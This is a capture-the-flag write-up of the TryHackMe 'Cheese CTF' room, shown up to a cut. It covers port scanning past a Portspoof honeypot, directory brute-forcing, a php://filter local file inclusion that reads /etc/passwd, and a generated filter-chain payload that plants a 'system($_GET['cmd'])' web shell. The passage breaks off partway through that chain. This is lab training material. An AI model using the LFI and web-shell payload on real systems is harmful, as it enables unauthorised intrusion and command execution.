<h1 align="center">Challenge 068 - Cheese CTF </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/05f0aca1-90d4-488e-b579-3733193670ab" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️ </p>

A room that seems to be inspired by some THM thread. Not that it matters much, as I just want to do another boot to root.

### User Flag
First let's go through basic Reconnaissance and use nmap. I used the command `nmap -Pn -sV -v 10.113.143.90`. But that already gives a large output.

```
...
Discovered open port 48080/tcp on 10.113.143.90
Discovered open port 5998/tcp on 10.113.143.90
Discovered open port 5718/tcp on 10.113.143.90
Discovered open port 3/tcp on 10.113.143.90
Discovered open port 6101/tcp on 10.113.143.90
Discovered open port 9535/tcp on 10.113.143.90
Discovered open port 5432/tcp on 10.113.143.90
Discovered open port 32768/tcp on 10.113.143.90
Discovered open port 7777/tcp on 10.113.143.90
Discovered open port 32780/tcp on 10.113.143.90
Discovered open port 1914/tcp on 10.113.143.90
Discovered open port 5960/tcp on 10.113.143.90
Discovered open port 10001/tcp on 10.113.143.90
Discovered open port 9666/tcp on 10.113.143.90
Discovered open port 5004/tcp on 10.113.143.90
Discovered open port 9502/tcp on 10.113.143.90
Discovered open port 1107/tcp on 10.113.143.90
Discovered open port 1296/tcp on 10.113.143.90
Discovered open port 6567/tcp on 10.113.143.90
Discovered open port 4002/tcp on 10.113.143.90
Discovered open port 5950/tcp on 10.113.143.90
Discovered open port 1030/tcp on 10.113.143.90
Discovered open port 50389/tcp on 10.113.143.90
Discovered open port 1009/tcp on 10.113.143.90
Discovered open port 3517/tcp on 10.113.143.90
Discovered open port 1092/tcp on 10.113.143.90
Discovered open port 5678/tcp on 10.113.143.90
Discovered open port 6792/tcp on 10.113.143.90
Discovered open port 417/tcp on 10.113.143.90
Discovered open port 4005/tcp on 10.113.143.90
Discovered open port 19/tcp on 10.113.143.90
Discovered open port 13722/tcp on 10.113.143.90
Discovered open port 3322/tcp on 10.113.143.90
Discovered open port 1213/tcp on 10.113.143.90
Discovered open port 1022/tcp on 10.113.143.90
...
```

This is the first time I'm seeing such a massive and highly unusual amount of open ports for a TryHackMe challenge. This points to a specific scenario: **Firewall Honeypot (Port Spoofing)**.

Some creators install tools like `Portspoof` or configure firewall rules to intentionally open thousand of ports. They do this to overwhelm our scanner, waste our time and hide the *real* open ports in a sea of fake ones. To verify we can look at the service versions (`-sV`). If Nmap finishes its scan and lists the service for almost all of these ports as exact duplicates (e.g., they all say "tcpwrapped" or they all return identical random text), we are dealing with a honeypot spoofing wall. 

I tried another port scan only targeting 4 of those ports.

```
root@ip-10-113-117-246:~# nmap -Pn -sV -p 8081,9081,5566 10.113.143.90
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-02 12:42 UTC
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 12:43 (0:00:22 remaining)
Nmap scan report for ip-10-113-143-90.eu-central-1.compute.internal (10.113.143.90)
Host is up (0.00029s latency).

PORT     STATE SERVICE          VERSION
5566/tcp open  http-proxy       DeleGate proxy 75131427
8081/tcp open  blackice-icecap?
9081/tcp open  cisco-aqos?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8081-TCP:V=7.94SVN%I=7%D=7/2%Time=6A465CBE%P=x86_64-pc-linux-gnu%r(
SF:NULL,36,"OK0100\x20eXtremail\x20V439\x20release\x202REMote\x20managemen
SF:t\x20\.\.\.\r\n")%r(GetRequest,36,"OK0100\x20eXtremail\x20V439\x20relea
SF:se\x202REMote\x20management\x20\.\.\.\r\n")%r(FourOhFourRequest,36,"OK0
SF:100\x20eXtremail\x20V439\x20release\x202REMote\x20management\x20\.\.\.\
SF:r\n")%r(SIPOptions,36,"OK0100\x20eXtremail\x20V439\x20release\x202REMot
SF:e\x20management\x20\.\.\.\r\n")%r(WWWOFFLEctrlstat,36,"OK0100\x20eXtrem
SF:ail\x20V439\x20release\x202REMote\x20management\x20\.\.\.\r\n")%r(Gener
SF:icLines,36,"OK0100\x20eXtremail\x20V439\x20release\x202REMote\x20manage
SF:ment\x20\.\.\.\r\n")%r(HTTPOptions,36,"OK0100\x20eXtremail\x20V439\x20r
SF:elease\x202REMote\x20management\x20\.\.\.\r\n")%r(RTSPRequest,36,"OK010
SF:0\x20eXtremail\x20V439\x20release\x202REMote\x20management\x20\.\.\.\r\
SF:n")%r(RPCCheck,36,"OK0100\x20eXtremail\x20V439\x20release\x202REMote\x2
SF:0management\x20\.\.\.\r\n")%r(DNSVersionBindReqTCP,36,"OK0100\x20eXtrem
SF:ail\x20V439\x20release\x202REMote\x20management\x20\.\.\.\r\n")%r(DNSSt
SF:atusRequestTCP,36,"OK0100\x20eXtremail\x20V439\x20release\x202REMote\x2
SF:0management\x20\.\.\.\r\n")%r(Help,36,"OK0100\x20eXtremail\x20V439\x20r
SF:elease\x202REMote\x20management\x20\.\.\.\r\n")%r(SSLSessionReq,36,"OK0
SF:100\x20eXtremail\x20V439\x20release\x202REMote\x20management\x20\.\.\.\
SF:r\n")%r(TerminalServerCookie,36,"OK0100\x20eXtremail\x20V439\x20release
SF:\x202REMote\x20management\x20\.\.\.\r\n")%r(TLSSessionReq,36,"OK0100\x2
SF:0eXtremail\x20V439\x20release\x202REMote\x20management\x20\.\.\.\r\n")%
SF:r(Kerberos,36,"OK0100\x20eXtremail\x20V439\x20release\x202REMote\x20man
SF:agement\x20\.\.\.\r\n")%r(SMBProgNeg,36,"OK0100\x20eXtremail\x20V439\x2
SF:0release\x202REMote\x20management\x20\.\.\.\r\n")%r(X11Probe,36,"OK0100
SF:\x20eXtremail\x20V439\x20release\x202REMote\x20management\x20\.\.\.\r\n
SF:")%r(LPDString,36,"OK0100\x20eXtremail\x20V439\x20release\x202REMote\x2
SF:0management\x20\.\.\.\r\n")%r(LDAPSearchReq,36,"OK0100\x20eXtremail\x20
SF:V439\x20release\x202REMote\x20management\x20\.\.\.\r\n")%r(LDAPBindReq,
SF:36,"OK0100\x20eXtremail\x20V439\x20release\x202REMote\x20management\x20
SF:\.\.\.\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9081-TCP:V=7.94SVN%I=7%D=7/2%Time=6A465CBE%P=x86_64-pc-linux-gnu%r(
SF:NULL,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n000000000000000000000\n
SF:")%r(GenericLines,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n0000000000
SF:00000000000\n")%r(GetRequest,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\
SF:n000000000000000000000\n")%r(HTTPOptions,2F,"VTUN\x20server\x20ver\x20\
SF:.\x208GeYOF\n000000000000000000000\n")%r(RTSPRequest,2F,"VTUN\x20server
SF:\x20ver\x20\.\x208GeYOF\n000000000000000000000\n")%r(RPCCheck,2F,"VTUN\
SF:x20server\x20ver\x20\.\x208GeYOF\n000000000000000000000\n")%r(DNSVersio
SF:nBindReqTCP,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n0000000000000000
SF:00000\n")%r(DNSStatusRequestTCP,2F,"VTUN\x20server\x20ver\x20\.\x208GeY
SF:OF\n000000000000000000000\n")%r(Help,2F,"VTUN\x20server\x20ver\x20\.\x2
SF:08GeYOF\n000000000000000000000\n")%r(SSLSessionReq,2F,"VTUN\x20server\x
SF:20ver\x20\.\x208GeYOF\n000000000000000000000\n")%r(TerminalServerCookie
SF:,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n000000000000000000000\n")%r
SF:(TLSSessionReq,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n0000000000000
SF:00000000\n")%r(Kerberos,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n0000
SF:00000000000000000\n")%r(SMBProgNeg,2F,"VTUN\x20server\x20ver\x20\.\x208
SF:GeYOF\n000000000000000000000\n")%r(X11Probe,2F,"VTUN\x20server\x20ver\x
SF:20\.\x208GeYOF\n000000000000000000000\n")%r(FourOhFourRequest,2F,"VTUN\
SF:x20server\x20ver\x20\.\x208GeYOF\n000000000000000000000\n")%r(LPDString
SF:,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n000000000000000000000\n")%r
SF:(LDAPSearchReq,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n0000000000000
SF:00000000\n")%r(LDAPBindReq,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n0
SF:00000000000000000000\n")%r(SIPOptions,2F,"VTUN\x20server\x20ver\x20\.\x
SF:208GeYOF\n000000000000000000000\n")%r(LANDesk-RC,2F,"VTUN\x20server\x20
SF:ver\x20\.\x208GeYOF\n000000000000000000000\n")%r(TerminalServer,2F,"VTU
SF:N\x20server\x20ver\x20\.\x208GeYOF\n000000000000000000000\n")%r(NCP,2F,
SF:"VTUN\x20server\x20ver\x20\.\x208GeYOF\n000000000000000000000\n")%r(Not
SF:esRPC,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n000000000000000000000\
SF:n")%r(JavaRMI,2F,"VTUN\x20server\x20ver\x20\.\x208GeYOF\n00000000000000
SF:0000000\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.03 seconds
```
Let's analyze the clues. Looking closely at the raw service fingerprints returned by ports `8081` and `9081`.

- **The Same Signature Everywhere:** Nmap sent completely different types of requests (`GetRequest`, `SIPOptions`, `SMBProgNeg`, `Help`) to port 8081. Every single time, the port responded with the exact same string: `OK0100 eXtremail V439 release 2REMote management ...`.
- **Impossible Behaviour:** A real application will drop the connection or return an error if you send it random data it does not understand. The fact that port 8081 replies with an `eXtremail` mail server banner to an HTTP request, a DNS request, and an SMB request proves it is a simulation script.
- **The Static Noise:** Port 9081 did the exact same thing, returning a static `VTUN server ver` string to every probe.

A defensive script (like `Portspoof`) is listening on all these ports and blindly spitting out fake banners from a massive list to confuse automated tools.

### How to Find the Real Web/Login Ports
To find the HTML web pages that are hosted on real services we have to differentiate between the fake ports that automaticall spit out simulated banners regeardless of what we send them. They will break standard HTTP traffic. A real web server will actually process an HTTP request and respond with HTML code (like `HTTP/1.1 200 OK`).

We can use `curl` to cut through the noise. If we run a loop in our terminal to check the open ports we found earlier to see which one returns actual HTML data.

```
root@ip-10-113-117-246:~# for port in 80 302 443 1199 2323 5566 8087 9081; do echo "Testing port $port..."; curl -s -I http://10.113.143.90:$port | head -n 1; done
Testing port 80...
HTTP/1.1 200 OK
Testing port 302...
Testing port 443...
Testing port 1199...
HTTP/1.1 500 ( Die Anforderung wurde vom HTTP-Filter zurückgewiesen. Wenden Sie sich an den ISA Server-Administrator.  )
Testing port 2323...
Testing port 5566...
HTTP/1.0 302 Moved
Testing port 8087...
HTTP/1.0 401 Unauthorized
Testing port 9081...
```

The `curl` loop successfully pierced through the port spoofing firewall.

We have four real, active HTTP services responding with distinct, legitimate web server behaviors instead of the fake Portspoof noise.

### Port 80 (`HTTP/1.1 200 OK`)
- **What it means:** This is a standard, fully functional web server. 

### Port 5566 (`HTTP/1.0 302 Moved`)
- **What it means:** The server is redirecting us somewhere else. Earlier our Nmap scan flagged this port as `DeleGate proxy`.
- **Next Step:** Check where it is trying to send us by running `curl -s -I http://10.113.143.90:5566` without cutting off the output. Look for the `Location:` header line to see the target URL.

```
root@ip-10-113-117-246:~# curl -s -I http://10.113.143.90:5566
HTTP/1.0 302 Moved
Date: f
Server: DeleGate/75131427
```

The `Server: DeleGate/75131427` header confirms that this is another fake honeyport port. Our `curl` request revealed two major clues that prove port 5566 is lying to us:
**1.The Impossible Date:** The `Date: f` header is completely broken. A real web server always returns a valid timestamp (like `Date: Thu, 02 Jul 2026 15:33:00 GMT`).
**2.The Exact Version Match:** Looking back at our first large Nmap scan. Nmap flagged port 5566 as `DeleGate proxy 75131427`. The fact that the version number is exactly the same number sequence (`75131427`) used in the header is a classic trait of a Portspoof script generating randomized engine names and versions on the fly.
**3. Missing Location:** A real `302 Moved` response *must* include a `Location:` header telling our browser where to go. This response has none.

### Port 8087 (`HTTP/1.0 401 Unauthorized`)
- **What it means:** This port is specifically asking for HTTP Basic Authentication (a pop-up box in our browser asking for a username and password before even showing a page).
- **Next Step:** Visiting this page might show a realm name (e.g., "Admin Console") that hints at what software is running there.

### Port 1199 (`HTTP/1.1 500 ... ISA Server-Administrator`)
- **What it means:** An "ISA Server" is an old Microsoft firewall/proxy (Internet Security and ISA Server). The filter is actively blocking the request or crashing. It is likely a dead end or a specific rabbit hole.

Furthermore I accidentally just checked port 302 with the browser by myself and saw the following.

<img width="531" height="389" alt="grafik" src="https://github.com/user-attachments/assets/b1b26ce6-6fa6-4f7f-9ce5-ca047eee8dfc" />

This is another piece of fake honeypot data generated by the `Portspoof` service.

The text we see is a simulated banner designed to look like an old or obscure Samsung router login interface, complete with raw network garbage characters (`Ã¿Ã» Ã¿Ã¾`) at the very top.
Portspoof doesn't just lie about port numbers - it also sends simulated banners when we connect.
- if we query port 302 using an HTTP tool or a web browser, the honeypot firewall simply grabs a random template from its database (in this case, an old Samsung Access Point configuration prompt) and spits it out to trick us into wasting time trying to brute-force a password that doesn't exist.

The website shows us the following

<img width="1120" height="896" alt="Bildschirmfoto vom 2026-07-02 14-09-23" src="https://github.com/user-attachments/assets/152b1176-7b88-4a1e-b9c9-398d524d275f" />

A website that sells the finest cheese, or so they say. The login option immediately seems to be the right place to check for some vulnerabilities. 

```
root@ip-10-113-117-246:~# gobuster dir -u 10.113.143.90 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.143.90
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://10.113.143.90/images/]
/index.html           (Status: 200) [Size: 1759]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

I don't really have any clues. I decided to check the images for hidden messages.

```
root@ip-10-113-117-246:~# wget 10.113.143.90/images/cheese1.jpg
--2026-07-02 13:51:47--  http://10.113.143.90/images/cheese1.jpg
Connecting to 10.113.143.90:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26022 (25K) [image/jpeg]
Saving to: 'cheese1.jpg'

cheese1.jpg         100%[===================>]  25.41K  --.-KB/s    in 0s      

2026-07-02 13:51:47 (547 MB/s) - 'cheese1.jpg' saved [26022/26022]

root@ip-10-113-117-246:~# wget 10.113.143.90/images/cheese2.jpg
--2026-07-02 13:51:54--  http://10.113.143.90/images/cheese2.jpg
Connecting to 10.113.143.90:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22578 (22K) [image/jpeg]
Saving to: 'cheese2.jpg'

cheese2.jpg         100%[===================>]  22.05K  --.-KB/s    in 0s      

2026-07-02 13:51:54 (534 MB/s) - 'cheese2.jpg' saved [22578/22578]

root@ip-10-113-117-246:~# wget 10.113.143.90/images/cheese3.jpg
--2026-07-02 13:51:56--  http://10.113.143.90/images/cheese3.jpg
Connecting to 10.113.143.90:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6258 (6.1K) [image/jpeg]
Saving to: 'cheese3.jpg'

cheese3.jpg         100%[===================>]   6.11K  --.-KB/s    in 0s      

2026-07-02 13:51:56 (637 MB/s) - 'cheese3.jpg' saved [6258/6258]
```

None of the usual wordlists worked. I tried switching to a highly specialized file discovery list with explicit extensions. I will try to make more use of this when I realize that a web application is processing everything through a single file (like `login.php` or `index.php`) and when I have identified the backend language. Generally I will also make more use of wordlists like `raft-large-files.txt` if the standard wordlists don't give me enough insight.

```
root@ip-10-113-117-246:~# gobuster dir -u 10.113.133.100 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -x php,txt,bak,inc,conf,config 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.133.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              config,php,txt,bak,inc,conf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 834]
/index.html           (Status: 200) [Size: 1759]
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.bak        (Status: 403) [Size: 279]
/.htaccess.config     (Status: 403) [Size: 279]
/.htaccess.conf       (Status: 403) [Size: 279]
/.htaccess.inc        (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/style.css            (Status: 200) [Size: 705]
/.                    (Status: 200) [Size: 1759]
/.html.txt            (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/.html.php            (Status: 403) [Size: 279]
/.html.config         (Status: 403) [Size: 279]
/.html.conf           (Status: 403) [Size: 279]
/.html.inc            (Status: 403) [Size: 279]
/.html.bak            (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.bak        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htpasswd.config     (Status: 403) [Size: 279]
/.htpasswd.inc        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.conf       (Status: 403) [Size: 279]
/.htm.php             (Status: 403) [Size: 279]
/.htm                 (Status: 403) [Size: 279]
/.htm.inc             (Status: 403) [Size: 279]
/.htm.txt             (Status: 403) [Size: 279]
/.htm.bak             (Status: 403) [Size: 279]
/.htm.conf            (Status: 403) [Size: 279]
/.htm.config          (Status: 403) [Size: 279]
/.htpasswds           (Status: 403) [Size: 279]
/.htpasswds.bak       (Status: 403) [Size: 279]
/.htpasswds.inc       (Status: 403) [Size: 279]
/.htpasswds.php       (Status: 403) [Size: 279]
/.htpasswds.config    (Status: 403) [Size: 279]
/.htpasswds.conf      (Status: 403) [Size: 279]
/.htpasswds.txt       (Status: 403) [Size: 279]
/users.html           (Status: 200) [Size: 377]
/.htgroup.php         (Status: 403) [Size: 279]
/.htgroup.bak         (Status: 403) [Size: 279]
/.htgroup.inc         (Status: 403) [Size: 279]
/.htgroup.txt         (Status: 403) [Size: 279]
/.htgroup.conf        (Status: 403) [Size: 279]
/.htgroup             (Status: 403) [Size: 279]
/.htgroup.config      (Status: 403) [Size: 279]
/wp-forum.phps        (Status: 403) [Size: 279]
/orders.html          (Status: 200) [Size: 380]
/.htaccess.bak.inc    (Status: 403) [Size: 279]
/.htaccess.bak.bak    (Status: 403) [Size: 279]
/.htaccess.bak        (Status: 403) [Size: 279]
/.htaccess.bak.conf   (Status: 403) [Size: 279]
/.htaccess.bak.config (Status: 403) [Size: 279]
/.htaccess.bak.php    (Status: 403) [Size: 279]
/.htaccess.bak.txt    (Status: 403) [Size: 279]
/.htuser.bak          (Status: 403) [Size: 279]
/.htuser.txt          (Status: 403) [Size: 279]
/.htuser.php          (Status: 403) [Size: 279]
/.htuser.inc          (Status: 403) [Size: 279]
/.htuser.config       (Status: 403) [Size: 279]
/.htuser.conf         (Status: 403) [Size: 279]
/.htuser              (Status: 403) [Size: 279]
/.ht.bak              (Status: 403) [Size: 279]
/.htc.config          (Status: 403) [Size: 279]
/.htc.conf            (Status: 403) [Size: 279]
/.ht.txt              (Status: 403) [Size: 279]
/.htc                 (Status: 403) [Size: 279]
/.ht.inc              (Status: 403) [Size: 279]
/.ht                  (Status: 403) [Size: 279]
/.ht.config           (Status: 403) [Size: 279]
/.ht.php              (Status: 403) [Size: 279]
/.ht.conf             (Status: 403) [Size: 279]
/.htc.bak             (Status: 403) [Size: 279]
/.htc.php             (Status: 403) [Size: 279]
/.htc.txt             (Status: 403) [Size: 279]
/.htc.inc             (Status: 403) [Size: 279]
/messages.html        (Status: 200) [Size: 448]
/.htaccess.old.inc    (Status: 403) [Size: 279]
/.htaccess.old        (Status: 403) [Size: 279]
/.htaccess.old.bak    (Status: 403) [Size: 279]
/.htaccess.old.php    (Status: 403) [Size: 279]
/.htaccess.old.conf   (Status: 403) [Size: 279]
/.htaccess.old.config (Status: 403) [Size: 279]
/.htaccess.old.txt    (Status: 403) [Size: 279]
/.htacess.bak         (Status: 403) [Size: 279]
/.htacess.inc         (Status: 403) [Size: 279]
/.htacess             (Status: 403) [Size: 279]
/.htacess.conf        (Status: 403) [Size: 279]
/.htacess.txt         (Status: 403) [Size: 279]
/.htacess.config      (Status: 403) [Size: 279]
/.htacess.php         (Status: 403) [Size: 279]
Progress: 177312 / 259301 (68.38%)[ERROR] parse "http://10.113.133.100/directory\t\te.g.": net/url: invalid control character in URL
[ERROR] parse "http://10.113.133.100/directory\t\te.g..php": net/url: invalid control character in URL
[ERROR] parse "http://10.113.133.100/directory\t\te.g..txt": net/url: invalid control character in URL
[ERROR] parse "http://10.113.133.100/directory\t\te.g..bak": net/url: invalid control character in URL
[ERROR] parse "http://10.113.133.100/directory\t\te.g..inc": net/url: invalid control character in URL
[ERROR] parse "http://10.113.133.100/directory\t\te.g..conf": net/url: invalid control character in URL
[ERROR] parse "http://10.113.133.100/directory\t\te.g..config": net/url: invalid control character in URL
/login.css            (Status: 200) [Size: 966]
Progress: 259294 / 259301 (100.00%)
===============================================================
Finished
===============================================================
```

Checking out the different html sites the *messages.html* was the one who would give the most insight.

<img width="585" height="202" alt="grafik" src="https://github.com/user-attachments/assets/f97e4894-1642-4a64-bbd8-027636524f95" />

By clicking on the link we see the following

<img width="751" height="130" alt="grafik" src="https://github.com/user-attachments/assets/19b4ac81-b345-4781-bb82-531df83a0e77" />

The URL also reads *http://10.113.133.100/secret-script.php?file=php://filter/resource=supersecretmessageforadmin*. Seems like a Local File Inclusion (LFI) vulnerability.

Specifically, the URL structure is trying to use a PHP Wrapper (`php://filter/`). This wrapper is a powerful built-in PHP feature that developers often misuse, allowing attackers to read files on the server that they shouldn't be able to see. The current parameter we found (`resource=supersecretmessageforadmin`) is trying to look for a file with that exact name in the local directory. If that file doesn't exist or requires an extension (like `.txt` or `.php`), it will fail.

Furthermore, when we use `php://filter/resource=filename`, PHP executes the file and displays the output. If the file contains a PHP code, the server will process it, and we won't see the raw source code.

For now let's use that to our advantage to find the passwd directory. I appended */etc/passwd* after the *file=* segment and got some cool results.

<img width="942" height="516" alt="grafik" src="https://github.com/user-attachments/assets/61480aac-26e3-4fa9-8dc4-1461e41792db" />

We dumped the `/etc/passwd` file! Looking at the very bottom, we can find a critical piece of information: there is a real user account named `comte` (with a home directory at `/home/comte`) and the default `ubuntu` user. Something to keep in mind.

I tried using `/home/comte/user.txt` and `/home/ubuntu/user.txt` with no results.

### LFI to RCE using PHP Filters
There was a PHP filter tag. Converting LFI into RCE using purely `php://filter` is a powerful technique. It relies on a known behavior in PHP where combining specific conversion filters (like `convert.iconv.*`) can carefully craft specific characters out of thin air in the server's memory, eventually forming a malicious PHP snippet (like `<?php system($_GET['cmd']); ?>` ).

For that we can use a well-known automated tool called `php_filter_chain_generator`. We clone the Generator Tool

<img width="945" height="744" alt="grafik" src="https://github.com/user-attachments/assets/f65a4543-51b9-4924-bafc-fd0e0cecb9a9" />

We run the script and tell it to generate a web shell payload. We want it to create a payload that lets us pass commands via a parameter called `cmd`:

```
root@ip-10-113-117-246:~/Downloads# ls
php_filter_chain_generator.py
root@ip-10-113-117-246:~/Downloads# python3 php_filter_chain_generator.py --chain "<?php system(\$_GET['cmd']); ?>"
[+] The following gadget chain will generate the following code : <?php system($_GET['cmd']); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|conver